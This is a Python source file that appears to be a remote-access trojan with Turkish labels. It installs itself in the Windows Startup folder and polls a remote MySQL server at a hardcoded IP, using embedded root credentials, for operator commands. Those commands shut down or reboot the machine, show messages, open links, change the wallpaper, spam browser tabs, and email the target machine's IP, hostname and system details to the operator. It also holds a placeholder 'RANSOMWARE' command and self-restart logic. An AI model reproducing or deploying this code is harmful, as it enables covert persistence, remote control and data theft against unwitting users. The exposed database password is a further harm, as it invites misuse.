from tkinter import messagebox
import mysql.connector
import os,sys,time,smtplib,turtle,socket,webbrowser,platform,os,time,datetime,getpass,ctypes


sistem = os.name
USER_NAME = getpass.getuser()
file_path = ""
####SET WİNDOWS STARTUP####
if sistem == "nt":
        if file_path == "":
                file_path = os.path.realpath(__file__)
        bat_path = r'C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'.format(USER_NAME)
        with open(bat_path + '\\' + "openPARGET.bat", "w+") as bat_file:
                bat_file.write(r'start "" "{}"'.format(file_path))
else:
        pass
####SET WİNDOWS STARTUP####

os.system('cls' if os.name in ('nt', 'dos') else 'clear')

            
IP = socket.gethostbyname(socket.gethostname())
PC= socket.gethostname()

YOUR_EMAİL_ADDRESS = ""    #Your Email Address
YOUR_EMAIL_APPLICATION_PASSWORD = "" #Follow --> Gmail>Accound>Application Password

        

def MAİN():
        try:
            while True:
                cnx = mysql.connector.connect(user = 'root', password = 'pyzhyc-gygBic-6hobso', host='91.151.88.110', database='AliceDataBase')
                cursor = cnx.cursor() 
                query = ("SELECT askupdate, message FROM updater")
                cursor.execute(query)
                for (askupdate,message) in cursor:
                        yanit = askupdate
                        mesaj = message
                if yanit == "1" or yanit== "KAPAT":
                        cursor = cnx.cursor()
                        cursor.execute("SELECT askupdate, message FROM updater")
                        data = cursor.fetchone()
                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                        cursor.execute(sql1)
                        cnx.commit()
                        os.system("shutdown -p")

                if yanit == "2" or yanit == "YENİDEN":
                        cursor = cnx.cursor()
                        cursor.execute("SELECT askupdate, message FROM updater")
                        data = cursor.fetchone()
                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                        cursor.execute(sql1)
                        cnx.commit()
                        os.system("shutdown -r")

                if yanit == "3" or yanit == "MESAJ":
                        messagebox.showinfo("SHALİA",mesaj)
                        cursor = cnx.cursor()
                        cursor.execute("SELECT askupdate, message FROM updater")
                        data = cursor.fetchone()
                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                        cursor.execute(sql1)
                        cnx.commit()
                        MAİN()

                if yanit == "4" or yanit == "LİNK GÖSTER" or yanit == "LİNK":
                        webbrowser.open(mesaj)
                        cursor = cnx.cursor()
                        cursor.execute("SELECT askupdate, message FROM updater")
                        data = cursor.fetchone()
                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                        cursor.execute(sql1)
                        cnx.commit()
                        MAİN()
                
                if yanit == "5" or yanit == "İDİOT":
                                picture_path = "hqdefault.jpg"
                                ctypes.windll.user32.SystemParametersInfoW(20, 0, picture_path, 3)
                                for i in range(25):
                                        time.sleep(1)
                                        webbrowser.open("https://www.youtube.com/watch?v=48rz8udZBmQ")
                                        webbrowser.open("https://www.youtube.com/watch?v=hiRacdl02w4&t=13s")
                                        messagebox.showinfo("SHALİA",mesaj)
                                messagebox.showinfo("SHALİA","Tamam. Bu Sadece Bir Şakaydı.")
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                sql1 = "UPDATE updater SET askupdate ='NONE'"
                                cursor.execute(sql1)
                                cnx.commit()
                                MAİN()
                        
                if yanit == "6" or yanit == "KALP":
                                try:
                                        turtle.bgcolor("black")
                                        turtle.pensize(2)
                                        def curve():
                                                for i in range(200):
                                                        turtle.right(1)
                                                        turtle.forward(1)
                                        turtle.speed(9999999999)
                                        turtle.color("red", "red")
                                        turtle.begin_fill()
                                        turtle.left(140)
                                        turtle.forward(111.65)
                                        curve()
                                        turtle.left(120)
                                        curve()
                                        turtle.forward(111.65)
                                        turtle.end_fill()
                                        turtle.hideturtle()
                                        turtle.color("white", "white")
                                        turtle.bgcolor("white")
                                        turtle.goto(-55,-250)
                                        turtle.color("black", "black")
                                        turtle.write("I LOVE YOU", font=("Verdana", 17,"bold"))

                                        turtle.exitonclick()
                                except:
                                        pass
                                        cursor = cnx.cursor()
                                        cursor.execute("SELECT askupdate, message FROM updater")
                                        data = cursor.fetchone()
                                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                                        cursor.execute(sql1)
                                        cnx.commit()
                                        MAİN()
                
                if yanit == "7" or yanit == "PCİNFO":
                        hostname = socket.gethostname()
                        plat = platform.processor()
                        system = platform.system()
                        machine = platform.machine()
                        toaddr = YOUR_EMAİL_ADDRESS
                        subject = "PROTON | Hedef Cihaz Bilgileri"
                        message = """
                        Hedef Cihaz Bilgileri:
                        IP: {}
                        PC: {}
                        İşlemci: {}
                        İşletim Sistemi: {}
                        Makine: {}
                        """.format(IP,PC,plat,system,machine)
                        content = 'Subject: {0},\n {1}'.format(subject, message)
                        mail = smtplib.SMTP('smtp.gmail.com', 587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(YOUR_EMAİL_ADDRESS, YOUR_EMAIL_APPLICATION_PASSWORD)
                        mail.sendmail(YOUR_EMAİL_ADDRESS, toaddr, content)
                        mail.close()

                        cursor = cnx.cursor()
                        cursor.execute("SELECT askupdate, message FROM updater")
                        data = cursor.fetchone()
                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                        cursor.execute(sql1)
                        cnx.commit()
                        MAİN()

                if yanit == "8" or yanit == "RANSOMWARE":
                        cursor = cnx.cursor()
                        cursor.execute("SELECT askupdate, message FROM updater")
                        data = cursor.fetchone()
                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                        cursor.execute(sql1)
                        cnx.commit()
                        MAİN()

                                        
                else:
                        time.sleep(1)
                        MAİN()
                        
        except:
                time.sleep(5)
                cursor = cnx.cursor()
                cursor.execute("SELECT askupdate, message FROM updater")
                data = cursor.fetchone()
                sql1 = "UPDATE updater SET askupdate ='NONE'"
                cursor.execute(sql1)
                cnx.commit()
                toaddr = YOUR_EMAİL_ADDRESS
                subject = "PROTON | Hedef Cihaz Bilgileri"
                message = """
                Hedef Cihaz Bilgileri:
                IP: {}
                CİHAZDA SORUN OLUŞTU! PROTON YENİDEN BAŞLATILDI!
                """.format(IP)
                content = 'Subject: {0},\n {1}'.format(subject, message)
                mail = smtplib.SMTP('smtp.gmail.com', 587)
                mail.ehlo()
                mail.starttls()
                mail.login(YOUR_EMAİL_ADDRESS, YOUR_EMAIL_APPLICATION_PASSWORD)
                mail.sendmail(YOUR_EMAİL_ADDRESS, toaddr, content)
                mail.close()
                os.execl(sys.executable, os.path.abspath(__file__), *sys.argv) 
                        


MAİN()






